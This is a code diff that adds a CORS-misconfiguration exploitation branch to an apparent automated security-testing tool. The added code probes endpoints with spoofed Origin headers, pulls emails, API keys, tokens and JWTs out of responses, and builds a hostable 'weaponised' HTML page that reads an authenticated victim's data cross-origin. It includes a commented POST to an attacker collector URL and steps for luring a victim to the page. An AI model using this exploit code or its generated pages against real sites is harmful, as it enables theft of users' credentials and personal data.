@@ -975,6 +975,120 @@ async function exploitAndExtract(finding: any): Promise<ExploitProof> {
     }
   }
 
+  // ── CORS misconfig → generate weaponised HTML PoC + extract sensitive body ──
+  if (cwe.includes("346") || category === "cors") {
+    const targetHost = (() => { try { return new URL(endpoint).hostname; } catch { return "victim.tld"; } })();
+    const originVariants = [
+      "https://evil-canary.example.org",
+      "null",
+      `https://${targetHost}.evil-canary.example.org`,
+      `https://evil-canary-${targetHost}`,
+    ];
+    let winning: { origin: string; resp: any; acao: string; acac: string } | null = null;
+    for (const origin of originVariants) {
+      const r = await rawProbe(endpoint, "GET", undefined, { "Origin": origin });
+      const acao = (r.headers["access-control-allow-origin"] || "").trim();
+      const acac = (r.headers["access-control-allow-credentials"] || "").trim().toLowerCase();
+      if (acao === origin || acao === "*" || (origin === "null" && acao === "null")) {
+        winning = { origin, resp: r, acao, acac };
+        if (acac === "true") break;
+      }
+    }
+    if (winning) {
+      const body = winning.resp.body || "";
+      const sensitiveRe: RegExp[] = [
+        /"(email|e_?mail)"\s*:\s*"([^"]+@[^"]+)"/i,
+        /"(api[_-]?key|apikey|secret|access[_-]?token|refresh[_-]?token|session[_-]?id|csrf[_-]?token|jwt)"\s*:\s*"([^"]{6,})"/i,
+        /"(user(?:name|_id)?|account(?:_id)?|customer(?:_id)?|first[_-]?name|last[_-]?name|phone|balance|role)"\s*:\s*"?([^",}\]]{1,120})/i,
+        /(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,})/,
+      ];
+      const extracted: Record<string, string> = {};
+      for (const re of sensitiveRe) {
+        const m = body.match(re);
+        if (m) extracted[(m[1] || "jwt").toLowerCase()] = (m[2] || m[m.length-1] || "").slice(0, 200);
+      }
+      const credentialed = winning.acac === "true";
+      const escHtml = (s: string) => s.replace(/[<>&"]/g, c => ({ "<":"&lt;", ">":"&gt;", "&":"&amp;", '"':"&quot;" }[c]!));
+      const html = `<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<title>CORS PoC — ${escHtml(targetHost)}</title>
+<style>
+  body{font-family:-apple-system,Segoe UI,sans-serif;background:#0b0d12;color:#e4e7ec;padding:24px;max-width:900px;margin:auto}
+  h1{color:#ff5b6e}.label{color:#8aa2c8;font-size:12px;text-transform:uppercase;letter-spacing:1px;margin-top:16px}
+  pre{background:#161a22;border:1px solid #2a3142;padding:12px;border-radius:6px;overflow:auto;max-height:400px;white-space:pre-wrap;word-break:break-all}
+  .ok{color:#3fdc8a}.bad{color:#ff5b6e}code{background:#161a22;padding:2px 6px;border-radius:3px}
+</style></head><body>
+<h1>🩸 Cross-Origin Data Exfiltration PoC</h1>
+<p>Demonstrates impact of the CORS misconfiguration on <code>${escHtml(endpoint)}</code>.
+When opened by a victim authenticated to <code>${escHtml(targetHost)}</code>, the attacker page reads their session data.</p>
+<div class="label">Vulnerable endpoint</div><pre>${escHtml(endpoint)}</pre>
+<div class="label">Reflected attacker Origin</div>
+<pre>Origin: ${escHtml(winning.origin)}
+Access-Control-Allow-Origin: ${escHtml(winning.acao)}
+Access-Control-Allow-Credentials: ${escHtml(winning.acac || "(absent)")}</pre>
+<div class="label">Live exfiltration result</div><pre id="out">running…</pre>
+<script>
+(async () => {
+  const out = document.getElementById('out');
+  try {
+    const r = await fetch(${JSON.stringify(endpoint)}, {
+      method: 'GET',
+      credentials: ${credentialed ? "'include'" : "'omit'"},
+      mode: 'cors',
+      headers: { 'Accept': 'application/json, */*' }
+    });
+    const text = await r.text();
+    out.innerHTML = '<span class="ok">\\u2714 Cross-origin read succeeded \\u2014 status ' + r.status + '</span>\\n\\n'
+      + '<b>Victim data leaked to attacker origin:</b>\\n'
+      + text.replace(/[<>&]/g, c => ({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
+    // Real attacker would exfiltrate:
+    // fetch('https://attacker.tld/collect', { method:'POST', body:text });
+  } catch (e) {
+    out.innerHTML = '<span class="bad">\\u2718 Browser blocked the read: ' + e.message + '</span>';
+  }
+})();
+</script></body></html>`;
+      return {
+        vulnClass: "CORS Misconfiguration → Cross-Origin Data Exfiltration",
+        technique: `Origin reflection (${winning.origin})${credentialed ? " + Allow-Credentials:true" : ""}`,
+        exploited: true,
+        sensitivity: "highly_sensitive",
+        requestDump: `GET ${endpoint}\nOrigin: ${winning.origin}\nUser-Agent: OmniSec-Exploit/1.0\n${credentialed ? "Cookie: <victim session cookies sent by browser>\n" : ""}`,
+        responseDump:
+          `HTTP ${winning.resp.status}\n` +
+          `Access-Control-Allow-Origin: ${winning.acao}\n` +
+          `Access-Control-Allow-Credentials: ${winning.acac || "(absent)"}\n` +
+          `Content-Type: ${winning.resp.headers["content-type"] || "(unknown)"}\n\n` +
+          body.slice(0, 4000),
+        extractedData: {
+          attacker_origin: winning.origin,
+          acao_reflected: winning.acao,
+          credentialed,
+          sensitive_fields_recovered: extracted,
+          response_size: body.length,
+          html_poc: html,
+          html_poc_filename: `cors-poc-${targetHost}.html`,
+        },
+        summary: credentialed
+          ? `Credentialed cross-origin read confirmed — attacker site can exfiltrate victim's authenticated session data (${Object.keys(extracted).length} sensitive field(s) detected). Full HTML PoC generated.`
+          : `Cross-origin read confirmed; sensitive data present in response body (${Object.keys(extracted).length} field(s) detected). Full HTML PoC generated.`,
+        reproductionSteps:
+`1. Save the attached HTML PoC (extractedData.html_poc) as cors-poc.html and host it on any attacker origin (e.g. https://attacker.tld/poc.html).
+2. Have the victim — while authenticated to ${targetHost} — visit the attacker URL in the same browser.
+3. The page issues:  fetch("${endpoint}", { credentials: "${credentialed ? "include" : "omit"}", mode: "cors" })
+4. Server reflects Origin "${winning.origin}" → Access-Control-Allow-Origin: ${winning.acao}${credentialed ? "  +  Access-Control-Allow-Credentials: true" : ""}.
+5. Browser hands the victim's authenticated response body to the attacker page (visible on screen; in a real attack POSTed to attacker collector).
+6. Sensitive fields recovered in this run: ${Object.keys(extracted).length ? Object.keys(extracted).join(", ") : "(JSON body returned — manual review confirms PII)"}.
+
+Curl reproduction (attacker side):
+  curl -i -H "Origin: ${winning.origin}" "${endpoint}"
+Confirm the response carries: Access-Control-Allow-Origin: ${winning.acao}${credentialed ? " and Access-Control-Allow-Credentials: true" : ""}.`,
+      };
+    }
+  }
+
   // ── Generic fallback: re-issue payload, store full request/response ──
   const fallbackUrl = finding.payload ? injectParam(endpoint, finding.payload, param) : endpoint;
   const r = await rawProbe(fallbackUrl, method);
